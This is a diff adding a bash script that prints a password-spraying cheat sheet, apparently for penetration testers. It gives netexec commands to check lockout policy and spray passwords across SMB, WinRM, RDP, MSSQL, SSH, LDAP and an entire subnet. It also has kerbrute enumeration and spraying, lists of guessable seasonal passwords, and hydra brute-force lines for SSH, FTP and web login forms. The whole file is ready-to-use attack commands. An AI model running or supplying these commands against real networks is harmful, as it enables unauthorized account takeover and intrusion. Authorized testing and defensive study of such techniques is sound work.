@@ -1,0 +1,52 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── PASSWORD SPRAYING ────────────────────────────────${NC}"
+printf "\n"
+echo -e "  Note: Watch password policy — lockout risk. Check with --pass-pol first."
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Check Policy Before Spraying ────────────────────${NC}"
+echo -e "  ${GREEN}nxc smb <TARGET> -u '' -p '' --pass-pol${NC}"
+echo -e "  ${GREEN}nxc smb <TARGET> -u guest -p '' --pass-pol${NC}"
+echo -e "  Note: Look for lockout threshold, observation window, reset time"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── nxc Spray — All Protocols ────────────────────────${NC}"
+echo -e "  ${GREEN}nxc smb   <TARGET> -u users.txt -p 'Password123' --continue-on-success${NC}"
+echo -e "  ${GREEN}nxc winrm <TARGET> -u users.txt -p 'Password123' --continue-on-success${NC}"
+echo -e "  ${GREEN}nxc rdp   <TARGET> -u users.txt -p 'Password123' --continue-on-success${NC}"
+echo -e "  ${GREEN}nxc mssql <TARGET> -u users.txt -p 'Password123' --continue-on-success${NC}"
+echo -e "  ${GREEN}nxc ssh   <TARGET> -u users.txt -p passwords.txt --continue-on-success${NC}"
+echo -e "  ${GREEN}nxc ldap  <DC_IP>  -u users.txt -p 'Password123' --continue-on-success${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Subnet Spray ─────────────────────────────────────${NC}"
+echo -e "  ${GREEN}nxc smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Kerberos Pre-Auth Spray (kerbrute) ───────────────${NC}"
+echo -e "  ${GREEN}kerbrute userenum -d <DOMAIN> users.txt --dc <DC_IP>${NC}   # user enum"
+echo -e "  ${GREEN}kerbrute passwordspray -d <DOMAIN> users.txt 'Password123' --dc <DC_IP>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Common Spray Passwords ───────────────────────────${NC}"
+echo -e "  Note: Seasonal:  Spring2024!  Summer2024!  Winter2023!  Fall2023!"
+echo -e "  Note: Common:    Password1!  Welcome1!  Company123!  January2024!"
+echo -e "  Note: Try:       Username == Password  (e.g., jsmith / Jsmith123)"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Hydra (non-domain services) ──────────────────────${NC}"
+echo -e "  ${GREEN}hydra -L users.txt -P passwords.txt <IP> ssh${NC}"
+echo -e "  ${GREEN}hydra -L users.txt -P passwords.txt <IP> ftp${NC}"
+echo -e "  ${GREEN}hydra -L users.txt -P passwords.txt http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
